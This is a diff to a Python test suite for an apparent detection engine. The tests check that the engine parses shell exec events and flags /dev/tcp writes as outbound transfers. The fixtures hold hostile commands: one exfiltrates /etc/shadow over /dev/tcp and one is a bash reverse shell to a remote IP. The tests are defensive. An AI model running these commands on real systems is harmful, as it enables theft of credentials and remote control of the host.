@@ -702,7 +702,8 @@ def test_discovery_cites_every_record_and_claim_total_matches():
 
 
 def test_unparseable_shell_c_script_counts_as_partial():
-    broken = exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 2>&1"],
+    # A genuinely unmodelled construct (command substitution): still partial, never a clean negative.
+    broken = exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 $(id)"],
                         executable="/bin/bash")
     repo = _repo()
     evaluate_context(repo, "h1", anchor(), link(), [broken])
@@ -713,11 +714,29 @@ def test_unparseable_shell_c_script_counts_as_partial():
 def test_the_final_pass_counts_an_unparseable_script_as_partial_coverage():
     repo = _repo()
     _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
-    _seed_link(repo, "h1", "L-A", "F-A", [exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 2>&1"],
+    _seed_link(repo, "h1", "L-A", "F-A", [exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 $(id)"],
                                                      executable="/bin/bash")])
     finalize_context(repo, "h1")
     cell = _cell(repo, "context.staging_and_transfer")
     assert cell["detail"]["missing_required"] >= 1 and cell["state"].endswith("_partial")
+
+
+def test_devtcp_exfil_with_stderr_dup_is_now_parsed_and_matched():
+    # A trailing `2>&1` no longer makes the whole script unevaluable: the /dev/tcp write is read.
+    event = exec_event("g", ["bash", "-c", "cat /etc/shadow > /dev/tcp/203.0.113.9/443 2>&1"],
+                       executable="/bin/bash")
+    match = one(StagingAndTransfer, [event])
+    assert len(match) == 1 and "T1048" in match[0].notes
+    assert "redirects output to /dev/tcp/203.0.113.9/443" in match[0].claim
+
+
+def test_devtcp_reverse_shell_redirect_is_read_as_outbound():
+    # The classic `bash -i >& /dev/tcp/h/p 0>&1` reverse-shell redirect, read as an outbound transfer.
+    event = exec_event("rs", ["bash", "-c", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"],
+                       executable="/bin/bash")
+    match = one(StagingAndTransfer, [event])
+    assert len(match) == 1 and "T1048" in match[0].notes
+    assert "redirects output to /dev/tcp/203.0.113.9/4444" in match[0].claim
 
 
 def test_staging_inbound_devtcp_is_ingress_not_transfer():
